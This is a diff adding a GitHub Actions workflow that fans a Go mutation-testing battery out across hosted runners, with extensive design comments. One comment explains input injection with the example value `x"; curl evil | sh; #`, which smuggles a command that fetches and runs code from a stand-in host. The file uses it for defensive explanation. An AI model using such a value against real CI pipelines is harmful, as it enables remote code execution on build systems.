@@ -1,0 +1,506 @@
+# Run a deletion-mutant battery as a hosted matrix, one runner per arm.
+#
+# WHY THIS EXISTS. A battery is embarrassingly parallel -- every arm is an
+# independent checkout, mutation and test run -- but on a single shared host it
+# is bounded by that host's cores, and a busy box turns a twenty-minute
+# measurement into a three-hour one or a load incident. Hosted runners are the
+# right venue for pure test fan-out: fifty arms cost fifty runners for one arm's
+# wall time each, and they take nothing from the shared host (bigboy).
+#
+# ONE AUTHORITY FOR THE RULES. Every classification decision here is made by
+# scripts/battery/*, the same shape of files the acr harness this was ported
+# from calls (CHAOS-5295, acr main d4a89e022b9d34a309b7a20347e28b91bcc971d8).
+# The workflow owns orchestration -- checkout, matrix, artifacts -- and owns
+# none of the semantics.
+#
+# WHAT A GREEN RUN MEANS: the _BASELINE arm was green on the pristine tree, the
+# _SENTINEL arm stayed green with an inert edit applied, every mutant in the
+# table reported a verdict, none of them survived unexpectedly, and no arm hit a
+# harness error. Anything less fails the workflow.
+#
+# TWO CHECKOUTS, AND THE DISTINCTION IS LOAD BEARING. The HARNESS
+# (scripts/battery/*) is checked out at the ref this workflow runs from, into
+# `harness/`. The TREE UNDER TEST is checked out at `tip`, into `target/`. They
+# are different things: `tip` is almost always a historical commit that predates
+# the harness entirely, so running the harness "from the checkout" finds nothing
+# there.
+#
+# DISPATCH ONLY, DELIBERATELY (ops scope decision, differs from the acr
+# original): no `pull_request`/`push` trigger here -- this workflow only ever
+# runs when someone explicitly names a tip and a table via workflow_dispatch,
+# it can never fire unasked. There is consequently no pre-merge smoke job
+# either; the acceptance proof for this port is a real post-merge dispatch on a
+# small subset, not a PR-triggered self-test.
+#
+# Hosted runners only. SELF_HOSTED_RUNNERS is disabled fleet-wide and the ARC
+# pool is gone, so there is no runner-label pair here to keep in sync.
+name: Mutation battery
+
+on:
+  workflow_dispatch:
+    inputs:
+      tip:
+        description: 'Full 40-hex commit sha to measure. Not a branch name: a battery is a statement about one tree, and a branch that moves mid-run makes the arms incomparable.'
+        required: true
+        type: string
+      packages:
+        description: 'Space-separated go package patterns, run WHOLE (no -run selector is ever derived). e.g. "./internal/jobs/workgraph/edges/ ./internal/jobs/investment/"'
+        required: true
+        type: string
+      table_path:
+        description: 'Path IN THE REPO at <tip> to the mutant table (TSV or JSONL). Leave blank if using table_b64.'
+        required: false
+        type: string
+        default: ''
+      table_b64:
+        description: 'base64 of the mutant table, for a table that is not committed. Exactly one of table_path/table_b64.'
+        required: false
+        type: string
+        default: ''
+      expected_survivors:
+        description: 'Space-separated mutant IDS allowed to survive. Empty means NONE, not "unchecked".'
+        required: false
+        type: string
+        default: ''
+      only_arms:
+        description: 'Comma-separated mutant ids to re-measure instead of the whole table, for recovering from an INFRASTRUCTURE arm. _BASELINE and _SENTINEL always run. The summary is marked PARTIAL and lists what was not measured, so a subset can never read as a full verdict.'
+        required: false
+        type: string
+        default: ''
+      go_test_timeout:
+        description: 'Explicit -timeout for every go test invocation.'
+        required: false
+        type: string
+        default: '20m'
+
+permissions:
+  contents: read
+
+concurrency:
+  # One battery per tip at a time. Two dispatches of the same tree would
+  # produce two artifact sets that are indistinguishable in the aggregate.
+  group: mutation-battery-${{ inputs.tip }}
+  cancel-in-progress: false
+
+env:
+  GO_VERSION: '1.27.0'
+
+jobs:
+  # Resolve the dispatch inputs in ONE place. The other jobs read only these
+  # outputs -- kept as its own job (rather than folded into plan) so a future
+  # second trigger shape, if ever added, still funnels through one place.
+  config:
+    name: config
+    runs-on: ubuntu-latest
+    outputs:
+      harness_sha: ${{ steps.h.outputs.harness_sha }}
+      tip: ${{ steps.c.outputs.tip }}
+      packages: ${{ steps.c.outputs.packages }}
+      table_path: ${{ steps.c.outputs.table_path }}
+      table_b64: ${{ steps.c.outputs.table_b64 }}
+      expected_survivors: ${{ steps.c.outputs.expected_survivors }}
+      go_test_timeout: ${{ steps.c.outputs.go_test_timeout }}
+      only_arms: ${{ steps.c.outputs.only_arms }}
+    steps:
+      # The HARNESS at this workflow's own ref.
+      # actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          path: harness
+          persist-credentials: false
+
+      - name: Record the harness sha
+        id: h
+        run: |
+          set -euo pipefail
+          # THE INSTRUMENT'S OWN SHA. A battery runs the CURRENT rules against a
+          # historical tip -- the rules are the instrument, the tip is the
+          # specimen -- which is only readable later if the provenance names
+          # BOTH.
+          echo "harness_sha=$(git -C harness rev-parse HEAD)" >> "$GITHUB_OUTPUT"
+          cat "$GITHUB_OUTPUT"
+
+      - name: Resolve the run parameters
+        id: c
+        # EVERY workflow_dispatch input reaches the shell through env:, never
+        # through ${{ }} interpolation. A dispatch input is attacker-controlled
+        # text; interpolated into a run: block it is executed, and a table path
+        # of `x"; curl evil | sh; #` would run. Through env: it is only ever
+        # data. Same rule in every run: step below.
+        env:
+          IN_TIP: ${{ inputs.tip }}
+          IN_PACKAGES: ${{ inputs.packages }}
+          IN_TABLE_PATH: ${{ inputs.table_path }}
+          IN_TABLE_B64: ${{ inputs.table_b64 }}
+          IN_EXPECTED: ${{ inputs.expected_survivors }}
+          IN_TIMEOUT: ${{ inputs.go_test_timeout }}
+          IN_ONLY_ARMS: ${{ inputs.only_arms }}
+        run: |
+          set -euo pipefail
+          {
+            echo "tip=$IN_TIP"
+            echo "packages=$IN_PACKAGES"
+            echo "table_path=$IN_TABLE_PATH"
+            echo "table_b64=$IN_TABLE_B64"
+            echo "expected_survivors=$IN_EXPECTED"
+            echo "go_test_timeout=$IN_TIMEOUT"
+            echo "only_arms=$IN_ONLY_ARMS"
+          } >> "$GITHUB_OUTPUT"
+          cat "$GITHUB_OUTPUT"
+
+  plan:
+    name: plan
+    needs: config
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.plan.outputs.matrix }}
+      arm_count: ${{ steps.plan.outputs.arm_count }}
+      matrix_size: ${{ steps.plan.outputs.matrix_size }}
+      run_scope: ${{ steps.plan.outputs.run_scope }}
+      sentinel_file: ${{ steps.plan.outputs.sentinel_file }}
+      floor: ${{ steps.floor.outputs.floor }}
+    steps:
+      # THE HARNESS, at this workflow's own ref. actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          path: harness
+          persist-credentials: false
+
+      # THE TREE UNDER TEST, at the tip being measured. actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          ref: ${{ needs.config.outputs.tip }}
+          path: target
+          persist-credentials: false
+
+      - name: Assert the tip is a full sha and is what we checked out
+        env:
+          TIP: ${{ needs.config.outputs.tip }}
+        run: |
+          set -euo pipefail
+          tip="$TIP"
+          case "$tip" in
+            [0-9a-f]*) ;;
+            *) echo "tip [$tip] is not lowercase hex -- pass a full 40-hex sha, not a branch"; exit 1 ;;
+          esac
+          [ "${#tip}" -eq 40 ] || { echo "tip [$tip] is ${#tip} chars, want 40"; exit 1; }
+          head=$(git -C target rev-parse HEAD)
+          [ "$head" = "$tip" ] || { echo "target/ is at $head, asked for $tip"; exit 1; }
+          echo "ok tip: target/ is at $head"
+          echo "ok harness: harness/ is at $(git -C harness rev-parse HEAD)"
+
+      - name: Resolve the mutant table
+        env:
+          TABLE_PATH: ${{ needs.config.outputs.table_path }}
+          TABLE_B64: ${{ needs.config.outputs.table_b64 }}
+        run: |
+          set -euo pipefail
+          p="$TABLE_PATH"
+          b="$TABLE_B64"
+          if [ -n "$p" ] && [ -n "$b" ]; then
+            echo "give exactly one of table_path / table_b64, not both"; exit 1
+          fi
+          if [ -z "$p" ] && [ -z "$b" ]; then
+            echo "give exactly one of table_path / table_b64"; exit 1
+          fi
+          if [ -n "$p" ]; then
+            # A committed table is read from the TREE UNDER TEST: it describes
+            # that tree's source, so it belongs to that tree's history.
+            [ -f "target/$p" ] || { echo "table_path [$p] does not exist at this tip"; exit 1; }
+            cp "target/$p" table.raw
+          else
+            printf '%s' "$b" | base64 -d > table.raw
+          fi
+          echo "table sha256: $(sha256sum table.raw | cut -d' ' -f1)"
+          wc -c table.raw
+
+      - name: Normalise and validate the table
+        run: python3 harness/scripts/battery/normalize_table.py table.raw --out table.jsonl
+
+      - name: Pre-flight every needle against this tree
+        # EARLY, before a single runner is spent on a suite: a stale table is
+        # cheap to detect here and expensive to discover across fifty jobs.
+        run: python3 harness/scripts/battery/preflight.py --root target --table table.jsonl
+
+      # actions/setup-go v6.5.0
+      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      - name: Warm the module cache, with retries
+        # BEFORE the floor and before any arm. A proxy reset here fails a
+        # retryable step by name; left inside a per-arm `go build` it arrives as
+        # a non-zero build and reads like a broken mutant.
+        run: bash harness/scripts/battery/fetch_modules.sh target 3 5
+
+      - name: Derive the func Test floor, with its negative control
+        id: floor
+        env:
+          PACKAGES: ${{ needs.config.outputs.packages }}
+        run: |
+          set -euo pipefail
+          # $PACKAGES is intentionally unquoted: it is a package LIST and must
+          # word-split. Coming from env: it cannot carry command substitution,
+          # only words -- and a bad word fails `go list` loudly rather than
+          # executing.
+          # shellcheck disable=SC2086
+          bash harness/scripts/battery/floor.sh target $PACKAGES | tee floor.tsv
+          total=$(awk -F'\t' '$1=="TOTAL"{print $2}' floor.tsv)
+          case "$total" in ''|*[!0-9]*) echo "floor unparseable [$total]"; exit 1 ;; esac
+          echo "floor=$total" >> "$GITHUB_OUTPUT"
+
+      - name: Build the matrix
+        id: plan
+        env:
+          ONLY_ARMS: ${{ needs.config.outputs.only_arms }}
+        run: |
+          set -euo pipefail
+          python3 harness/scripts/battery/plan_matrix.py --table table.jsonl \
+            --only-arms "$ONLY_ARMS" > matrix.json 2> plan.err
+          cat plan.err
+          echo "matrix=$(cat matrix.json)" >> "$GITHUB_OUTPUT"
+          grep -E '^(arm_count|table_arm_count|matrix_size|sentinel_file|run_scope)=' plan.err >> "$GITHUB_OUTPUT"
+
+      - name: Publish the plan to the job summary
+        env:
+          TIP: ${{ needs.config.outputs.tip }}
+          HARNESS_SHA: ${{ needs.config.outputs.harness_sha }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
+          ARM_COUNT: ${{ steps.plan.outputs.arm_count }}
+          RUN_SCOPE: ${{ steps.plan.outputs.run_scope }}
+          MATRIX_SIZE: ${{ steps.plan.outputs.matrix_size }}
+          FLOOR: ${{ steps.floor.outputs.floor }}
+          GO_TEST_TIMEOUT: ${{ needs.config.outputs.go_test_timeout }}
+          EXPECTED_SURVIVORS: ${{ needs.config.outputs.expected_survivors }}
+        run: |
+          {
+            echo "### Battery plan"
+            echo
+            echo "| field | value |"
+            echo "|---|---|"
+            echo "| tip (tree under test) | \`$TIP\` |"
+            echo "| harness sha (rules that classify) | \`$HARNESS_SHA\` |"
+            echo "| packages | \`$PACKAGES\` |"
+            echo "| arms measured | $ARM_COUNT |"
+            echo "| run scope | $RUN_SCOPE |"
+            echo "| matrix jobs (arms + baseline + sentinel) | $MATRIX_SIZE |"
+            echo "| floor (SUM over the package list) | $FLOOR |"
+            echo "| go test timeout | \`$GO_TEST_TIMEOUT\` |"
+            echo "| expected survivors | \`$EXPECTED_SURVIVORS\` |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # The normalised table travels to every arm and to the aggregate, so all
+      # three stages read byte-identical input rather than each re-parsing the
+      # raw table and possibly disagreeing.
+      # actions/upload-artifact v5.0.0
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: battery-table
+          path: table.jsonl
+          retention-days: 7
+
+  arm:
+    name: arm ${{ matrix.id }}
+    needs: [config, plan]
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false   # one arm's verdict never cancels another's; the
+                         # aggregate is the verdict, and a partial matrix is a
+                         # harness error rather than a smaller battery.
+      max-parallel: 50
+      matrix: ${{ fromJson(needs.plan.outputs.matrix) }}
+    steps:
+      # THE HARNESS. actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          path: harness
+          persist-credentials: false
+
+      # THE TREE UNDER TEST. actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          ref: ${{ needs.config.outputs.tip }}
+          path: target
+          persist-credentials: false
+
+      # actions/setup-go v6.5.0
+      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+          cache-dependency-path: target/go.sum
+
+      # actions/download-artifact v6.0.0
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
+        with:
+          name: battery-table
+          path: .battery
+
+      - name: Warm the module cache, with retries
+        # BEFORE the mutation is applied, so a transient fetch failure fails a
+        # retryable step rather than corrupting this arm's measurement.
+        run: bash harness/scripts/battery/fetch_modules.sh target 3 5
+
+      - name: Extract this arm's spec
+        env:
+          ARM_ID: ${{ matrix.id }}
+        run: |
+          set -euo pipefail
+          mkdir -p .battery/out
+          if [ "$ARM_ID" = "_BASELINE" ] || [ "$ARM_ID" = "_SENTINEL" ]; then
+            echo "harness arm, no spec"
+            exit 0
+          fi
+          python3 - "$ARM_ID" .battery/table.jsonl .battery/spec.json <<'PY'
+          import io, json, sys
+          want, table, out = sys.argv[1], sys.argv[2], sys.argv[3]
+          for line in io.open(table, encoding="utf-8"):
+              if not line.strip():
+                  continue
+              m = json.loads(line)
+              if m["id"] == want:
+                  io.open(out, "w", encoding="utf-8").write(json.dumps(m))
+                  raise SystemExit(0)
+          print("no such mutant id in the table: %s" % want, file=sys.stderr)
+          raise SystemExit(1)
+          PY
+
+      - name: Run the arm
+        env:
+          MB_GO_TEST_TIMEOUT: ${{ needs.config.outputs.go_test_timeout }}
+          # A path inside the TREE UNDER TEST, not the harness.
+          MB_SENTINEL_FILE: ${{ github.workspace }}/target/${{ needs.plan.outputs.sentinel_file }}
+          MB_ARM_LOG: ${{ github.workspace }}/.battery/out/arm.log
+          ARM_ID: ${{ matrix.id }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
+          FLOOR: ${{ needs.plan.outputs.floor }}
+        # This step must SUCCEED even when the arm's verdict is bad: the verdict
+        # travels as an artifact and the aggregate decides. A failing step here
+        # would lose the artifact and turn a real SURVIVED into a missing arm.
+        run: |
+          bash harness/scripts/battery/run_arm.sh \
+            "$PWD/target" "$ARM_ID" "$PWD/.battery/spec.json" \
+            "$PACKAGES" "$FLOOR" \
+            "$PWD/.battery/out/$ARM_ID.json"
+
+      - name: Show this arm's verdict
+        env:
+          ARM_ID: ${{ matrix.id }}
+        run: cat ".battery/out/$ARM_ID.json"
+
+      # actions/upload-artifact v5.0.0
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        if: always()
+        with:
+          name: battery-arm-${{ matrix.id }}
+          path: |
+            .battery/out/${{ matrix.id }}.json
+            .battery/out/arm.log
+          retention-days: 7
+
+  aggregate:
+    name: aggregate
+    needs: [config, plan, arm]
+    # `always()` so a matrix job that died still reaches the aggregate, which
+    # reports it as a missing arm -- a HARNESS_ERROR -- instead of the run
+    # simply skipping the verdict and looking inconclusive.
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      # ONLY the harness: the aggregate reads verdicts, never source.
+      # actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          path: harness
+          persist-credentials: false
+
+      # actions/download-artifact v6.0.0
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
+        with:
+          pattern: battery-arm-*
+          path: .battery/arms
+
+      # actions/download-artifact v6.0.0
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
+        with:
+          name: battery-table
+          path: .battery
+
+      - name: Merge the arms into the one verdict
+        id: merge
+        env:
+          EXPECTED_SURVIVORS: ${{ needs.config.outputs.expected_survivors }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
+          TIP: ${{ needs.config.outputs.tip }}
+          HARNESS_SHA: ${{ needs.config.outputs.harness_sha }}
+          ONLY_ARMS: ${{ needs.config.outputs.only_arms }}
+          FLOOR: ${{ needs.plan.outputs.floor }}
+        run: |
+          # THIS STEP REPORTS; IT DOES NOT JUDGE. GitHub runs every `run:` under
+          # `bash -eo pipefail`, and a plain `set -uo pipefail` does NOT clear
+          # the inherited -e -- so a non-zero verdict would kill this step
+          # before the summary could be published or the artifact uploaded.
+          # `set +e` and an explicit `exit 0` keep the verdict where it
+          # belongs: the step below.
+          set +e
+          set -uo pipefail
+          python3 harness/scripts/battery/aggregate.py \
+            --table .battery/table.jsonl \
+            --arms-dir .battery/arms \
+            --expected-survivors "$EXPECTED_SURVIVORS" \
+            --execution-shape hosted \
+            --packages "$PACKAGES" \
+            --tip "$TIP" \
+            --harness-sha "$HARNESS_SHA" \
+            --only-arms "$ONLY_ARMS" \
+            --floor "$FLOOR" \
+            --summary-out summary.txt
+          rc=$?
+          echo "rc=$rc" >> "$GITHUB_OUTPUT"
+          echo "aggregate rc=$rc (recorded; the verdict is owned by the next step)"
+          exit 0
+
+      - name: Publish the summary
+        if: always()
+        run: |
+          {
+            echo "### Battery result"
+            echo
+            echo '```'
+            cat summary.txt 2>/dev/null || echo "no summary was produced"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # actions/upload-artifact v5.0.0
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        if: always()
+        with:
+          name: battery-summary
+          path: summary.txt
+          retention-days: 30
+
+      - name: Fail the workflow on the aggregate's verdict
+        # The single verdict. Re-run rather than reading it off the step above,
+        # so the workflow's own conclusion comes from the aggregate's rc and not
+        # from a captured string that could go stale.
+        env:
+          EXPECTED_SURVIVORS: ${{ needs.config.outputs.expected_survivors }}
+          PACKAGES: ${{ needs.config.outputs.packages }}
+          TIP: ${{ needs.config.outputs.tip }}
+          HARNESS_SHA: ${{ needs.config.outputs.harness_sha }}
+          ONLY_ARMS: ${{ needs.config.outputs.only_arms }}
+          FLOOR: ${{ needs.plan.outputs.floor }}
+        run: |
+          python3 harness/scripts/battery/aggregate.py \
+            --table .battery/table.jsonl \
+            --arms-dir .battery/arms \
+            --expected-survivors "$EXPECTED_SURVIVORS" \
+            --execution-shape hosted \
+            --packages "$PACKAGES" \
+            --tip "$TIP" \
+            --harness-sha "$HARNESS_SHA" \
+            --only-arms "$ONLY_ARMS" \
+            --floor "$FLOOR" \
+            --summary-out /dev/null > /dev/null
